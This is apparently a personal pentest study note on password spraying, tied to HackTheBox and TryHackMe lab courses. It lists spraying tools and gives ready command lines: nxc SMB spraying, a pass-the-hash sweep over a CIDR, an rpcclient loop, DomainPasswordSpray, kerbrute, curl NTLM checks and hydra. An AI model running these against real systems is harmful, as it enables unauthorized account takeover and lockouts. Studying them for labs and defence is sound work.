# Password spraying

[![active_directory_enumeration_attacks](../../../../_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
[![breachingad](../../../../_badges/thm/breachingad.svg)](https://tryhackme.com/r/room/breachingad)
[![passwordattacks](../../../../_badges/thmp/passwordattacks.svg)](https://tryhackme.com/room/passwordattacks)

<div class="row row-cols-lg-2"><div>

Password spraying is a technique that is the most commonly used nowadays to find a working credential pair.

We select a password and test it on a list of usernames. After a delay, we repeat this step with another password. 🤖

Many companies have some [password policy](policy.md) that may include account lookout after a certain number of failed attempts, which makes brute force impractical as we would lock all accounts.
</div><div>

Some tools you might use:

* [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit) <small>(1.4k ⭐, 2022 🪦)</small>
* [TREVORspray](https://github.com/blacklanternsecurity/TREVORspray) <small>(0.9k ⭐)</small>
* [CredMaster](https://github.com/knavesec/CredMaster) <small>(0.8k ⭐)</small>

Many [network authentication tools](/cybersecurity/red-team/s2.discovery/techniques/network/auth.md) can be used such as `hydra -C`.
</div></div>

<hr class="sep-both">

## Windows Credentials Password spraying

<div class="row row-cols-lg-2"><div>

#### Leveraging SMB

[![active_directory_enumeration_attacks](../../../../_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)

You can use [SMB](/operating-systems/networking/protocols/smb.md):

```ps
$ nxc smb IP -u wordlist -p PasswordHere
$ nxc smb IP -u wordlist -p PasswordHere | grep +
$ nxc smb --local-auth CIDR -u administrator -H hash | grep +
```

#### Leveraging RPC

[![active_directory_enumeration_attacks](../../../../_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)

A very poor but straightforward [RPC](/operating-systems/networking/protocols/rpc.md) password spraying:

```ps
$ for u in $(cat wordlist);do rpcclient -U "$u%PasswordHere" -c "getusername;quit" IP | grep Authority; done
```
</div><div>

#### Leveraging A Domain-joined Host

[![active_directory_enumeration_attacks](../../../../_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)

You may use [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) <small>(1.6k ⭐)</small>:

```ps
PS> Import-Module .\DomainPasswordSpray.ps1
PS> Invoke-DomainPasswordSpray -Password PasswordHere -OutFile output.txt -ErrorAction SilentlyContinue
```

#### Leveraging Kerberos Authentication Module

[![active_directory_enumeration_attacks](../../../../_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)

We can use [kerbrute](/cybersecurity/red-team/tools/utilities/windows/kerbrute.md):

```ps
$ kerbrute passwordspray -d domain --dc IP valid_users.txt mypassword
```
</div></div>

<hr class="sep-both">

## HTTP LDAP Credentials Password spraying

[![breachingad](../../../../_badges/thm/breachingad.svg)](https://tryhackme.com/r/room/breachingad)

<div class="row row-cols-lg-2"><div>

We can use `curl` to test a pair of credentials:

```ps
$ curl URL -u "username:password" --ntlm
```

We can also use tools such as hydra:

```ps
$ hydra -L usernames.txt -p password example.com http-get
```
</div><div>
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* [sprayhound](https://github.com/Hackndo/sprayhound)
</div><div>
</div></div>